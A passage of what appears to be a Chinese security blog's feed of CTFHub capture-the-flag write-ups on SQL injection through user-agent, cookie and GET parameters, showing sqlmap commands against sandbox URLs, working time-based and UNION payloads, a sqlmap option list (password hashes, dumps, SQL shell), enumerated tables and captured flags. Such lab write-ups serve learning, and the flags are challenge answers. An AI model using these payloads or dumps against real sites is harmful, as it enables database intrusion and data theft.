class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: User-Agent (User-Agent)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071103 Firefox/2.0.0.9 (Swiftfox) AND (SELECT 5455 FROM (SELECT(SLEEP(5)))vwyE)# uOgB</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (random number) - 2 columns</span><br><span class="line">    Payload: -3044 UNION ALL SELECT CONCAT(0x717a787671,0x436c6f7263544a7473717063674f6742757550596162746662686b566368784f6d79775567594974,0x7170707671),3573-- -</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: UA注入</span><br><span class="line">title: UA注入</span><br><span class="line">title: UA注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: UA注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:                                                                                             </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                                                                                       </span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| htlcwkgzgr |</span><br><span class="line">| news       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: htlcwkgzgr</span><br><span class="line">[1 column]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| hhuhfrudir | varchar(100) |</span><br><span class="line">+------------+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: htlcwkgzgr</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| hhuhfrudir                       |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;0d92a40284dade61e614dd4d&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie注入</title>
      <link href="/2024/11/23/Cookie%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/23/Cookie%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: id (Cookie)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1 AND 2366=2366</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1 AND (SELECT 4938 FROM (SELECT(SLEEP(5)))dEgG)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=-5888 UNION ALL SELECT CONCAT(0x7162786b71,0x7878714d716972454578746451454d494c636f62545556576b504b4f7976505651705a416f514a63,0x7170767871),NULL-- -</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: Cookie注入</span><br><span class="line">title: Cookie注入</span><br><span class="line">title: Cookie注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: Cookie注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:                                                                                                                  </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                                                                                                            </span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| ahjsfimrve |</span><br><span class="line">| news       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: ahjsfimrve</span><br><span class="line">[1 column]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| sqiiksbqgz | varchar(100) |</span><br><span class="line">+------------+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: ahjsfimrve</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| sqiiksbqgz                       |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;16b9a1f9bff37d4f80eb8bc2&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL结构</title>
      <link href="/2024/11/23/MySQL%E7%BB%93%E6%9E%84/"/>
      <url>/2024/11/23/MySQL%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h1><p>根据网页显示内容输入1进行测试，此题可能存在 SQL 注入。此题与前一题类似，这次使用手工注入。先判断是否存在注入，发现存在注入后检查注入点。判断字段数量，然后检查数据库位置，知道数据库位置后<a href="https://so.csdn.net/so/search?q=%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC&amp;spm=1001.2101.3001.7020">查看数据库版本</a>和数据库名。接着查看全部数据库名，并查看这些数据库的表名，最后在 lvlbiqemvj 表中的数据发现此题 flag 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tags: [web渗透]</span><br><span class="line">title: MySQL结构</span><br><span class="line">title: MySQL结构</span><br><span class="line">title: MySQL结构</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: MySQL结构</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1 AND (SELECT 4673 FROM (SELECT(SLEEP(5)))Zdxl)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=-3592 UNION ALL SELECT CONCAT(0x7171717871,0x47507355576e4e6b494d4c75586462704e727346624f6d564d6e6668534473684f79787847454a55,0x717a7a7671),NULL-- -</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                                                                                                            </span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| egymeqgjcz |</span><br><span class="line">| news       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                                                                                                            </span><br><span class="line">Table: egymeqgjcz</span><br><span class="line">[1 column]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| zfhrovplks | varchar(100) |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">Database: sqli</span><br><span class="line">Table: news</span><br><span class="line">[2 columns]</span><br><span class="line">+--------+-------------+</span><br><span class="line">| Column | Type        |</span><br><span class="line">+--------+-------------+</span><br><span class="line">| data   | varchar(20) |</span><br><span class="line">| id     | int(10)     |</span><br><span class="line">+--------+-------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: egymeqgjcz</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| zfhrovplks                       |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;4ab37bed5dffcdbe6b965b8a&#125; |</span><br><span class="line">+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间盲注</title>
      <link href="/2024/11/23/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2024/11/23/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h3 id="时间盲注简介"><a href="#时间盲注简介" class="headerlink" title="时间盲注简介"></a>时间盲注简介</h3><p>时间盲注又称延迟注入，个人理解，适用于==页面不会返回错误信息，只会回显一种界面==，其主要特征是==利用sleep函数，制造时间延迟，由回显时间来判断是否报错==。<br>官方理解：<strong>利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://challenge-1715702b3e026ca9.sandbox.ctfhub.com:10800/?id=1&quot;  </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1 AND (SELECT 9203 FROM (SELECT(SLEEP(5)))WNiH)</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 时间盲注</span><br><span class="line">title: 时间盲注</span><br><span class="line">title: 时间盲注</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 时间盲注</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;db50ceb57b14564b0aba5db0&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注</title>
      <link href="/2024/11/15/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
      <url>/2024/11/15/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="技术"><a href="#技术" class="headerlink" title="技术 #"></a><strong>技术</strong> <a href="https://wiki.wgpsec.org/knowledge/tools/sqlmap.html#%E6%8A%80%E6%9C%AF">#</a></h4><p>以下选项用于调整特定 SQL 注入技术的测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH<span class="comment">#使用的 SQL 注入技术（默认为“BEUSTQ”)</span></span><br><span class="line">B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（堆查询注入）</span><br><span class="line">T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">Q: inline Query injection（内联查询注入）</span><br><span class="line"></span><br><span class="line">--time-sec=TIMESEC  <span class="comment">#设置延时注入的时间（默认为 5）</span></span><br><span class="line">--second-order=S..  <span class="comment">#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span></span><br></pre></td></tr></table></figure><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举 #"></a><strong>枚举</strong> <a href="https://wiki.wgpsec.org/knowledge/tools/sqlmap.html#%E6%9E%9A%E4%B8%BE">#</a></h4><p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-a, --all          <span class="comment">#获取所有信息、数据</span></span><br><span class="line">-b, --banner        <span class="comment">#获取 DBMS banner,返回数据库的版本号</span></span><br><span class="line">--current-user<span class="comment">#获取 DBMS 当前用户</span></span><br><span class="line">--current-db<span class="comment">#获取 DBMS 当前数据库</span></span><br><span class="line">--hostname<span class="comment">#获取 DBMS 服务器的主机名</span></span><br><span class="line">--is-dba<span class="comment">#探测 DBMS 当前用户是否为 DBA（数据库管理员）</span></span><br><span class="line">--<span class="built_in">users</span><span class="comment">#枚举出 DBMS 所有用户</span></span><br><span class="line">--passwords<span class="comment">#枚举出 DBMS 所有用户的密码哈希</span></span><br><span class="line">--privileges<span class="comment">#枚举出 DBMS 所有用户特权级</span></span><br><span class="line">--roles<span class="comment">#枚举出 DBMS 所有用户角色</span></span><br><span class="line"></span><br><span class="line">--dbs<span class="comment">#枚举出 DBMS 所有数据库</span></span><br><span class="line">--tables<span class="comment">#枚举出 DBMS 数据库中的所有表</span></span><br><span class="line">--columns<span class="comment">#枚举出 DBMS 表中的所有列</span></span><br><span class="line">--schema<span class="comment">#枚举出 DBMS 所有模式</span></span><br><span class="line">--count<span class="comment">#获取数据表数目</span></span><br><span class="line">--dump<span class="comment">#导出 DBMS 数据库表项</span></span><br><span class="line">--stop 10<span class="comment">#只取前10行数据</span></span><br><span class="line">  </span><br><span class="line">-D DB<span class="comment">#指定要枚举的 DBMS 数据库</span></span><br><span class="line">-T TBL<span class="comment">#指定要枚举的 DBMS 数据表</span></span><br><span class="line">-C COL<span class="comment">#指定要枚举的 DBMS 数据列</span></span><br><span class="line">  </span><br><span class="line">--sql-query=QUERY<span class="comment">#指定要执行的 SQL 语句</span></span><br><span class="line">--sql-shell<span class="comment">#调出交互式 SQL shell</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(110) |</span><br><span class="line">+--------+--------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+-----------------+</span><br><span class="line">| flag            |</span><br><span class="line">+-----------------+</span><br><span class="line">| ctfhub&#123;9766ed9X |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错型sql注入</title>
      <link href="/2024/11/15/%E6%8A%A5%E9%94%99%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/15/%E6%8A%A5%E9%94%99%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="报错型sql注入"><a href="#报错型sql注入" class="headerlink" title="报错型sql注入"></a>报错型<a href="sql注入.md">sql注入</a></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 6031 FROM (SELECT(SLEEP(5)))HxQg) AND &#x27;TYVz&#x27;=&#x27;TYVz</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=-6758&#x27; UNION ALL SELECT NULL,CONCAT(0x71716b6271,0x6b4f427268554c41585a6c62706e70755161624c684e6b574950737365477945575762454c567758,0x71627a6a71)-- -</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 报错型sql注入</span><br><span class="line">title: 报错型sql注入</span><br><span class="line">title: 报错型sql注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 报错型sql注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<code>sqlmap -u &quot;http://challenge-68616053fb31adea.sandbox.ctfhub.com:10800/?id=1&quot;</code>​</p><p>‍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;d6d7550c0c1cf1fc939bb395&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具下载</title>
      <link href="/2024/11/14/%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD/"/>
      <url>/2024/11/14/%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p> web共计5道题目 主要考察JS文件，robots.txt文件作用，base64解码，传参，命令执行</p></blockquote><p>工具:</p><ul><li><p>[X] 编码网站 <a href="https://www.dcode.fr/">dCode - 求解器、加密、数学、代码、在线计算</a>​</p></li><li><p>[X] phpstudy：安装教程<a href="https://blog.csdn.net/wleiloaf/article/details/121662832">https://blog.csdn.net/wleiloaf/article/details/121662832</a></p></li><li><p>[X] Mimikyu靶场：下载地址<a href="https://github.com/tanyiqu/Mimikyu/archive/refs/heads/main.zip">https://github.com/tanyiqu/Mimikyu/archive/refs/heads/main.zip</a></p></li><li><p>[X] Yakit抓包工具:安装教程<a href="https://blog.csdn.net/weixin\_44257023/article/details/126427753">https://blog.csdn.net/weixin\_44257023/article/details/126427753</a></p></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>Misc共计5道题目 主要考察二进制文件如何记事本编辑打开，gif图片帧分析Stegsolve，zip压缩包爆破以及伪 加密，社工题等</p></blockquote><p>工具:</p><ul><li>[X] Stegsolve：<a href="https://blog.csdn.net/wzk4869/article/details/132635923">https://blog.csdn.net/wzk4869/article/details/132635923</a></li><li><p>[X] web版 <a href="https://georgeom.net/StegOnline/upload">Steg在线 —- StegOnline</a></p></li><li><p>[X] ARCHPR：<a href="https://blog.csdn.net/csjjjd/article/details/135098907">https://blog.csdn.net/csjjjd/article/details/135098907</a></p></li></ul><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><blockquote><p> Re共计3道题目 主要考察pyc反编译，ida软件反编译</p></blockquote><p>工具:</p><ul><li>[X] ida软件:安装教程<a href="https://mp.weixin.qq.com/s/Yow4dG6M\_ZqmSIFw736lzg">https://mp.weixin.qq.com/s/Yow4dG6M\_ZqmSIFw736lzg</a></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><blockquote><p> Pwn共计3道题目 主要考察栈溢出，x64寄存器，ret2syscall</p></blockquote><p>工具:</p><ul><li><p>[X] Vmare虚拟机:安装教程 <a href="https://blog.csdn.net/Du\_XiaoNan/article/details/136138427">https://blog.csdn.net/Du\_XiaoNan/article/details/136138427</a></p></li><li><p>[X] 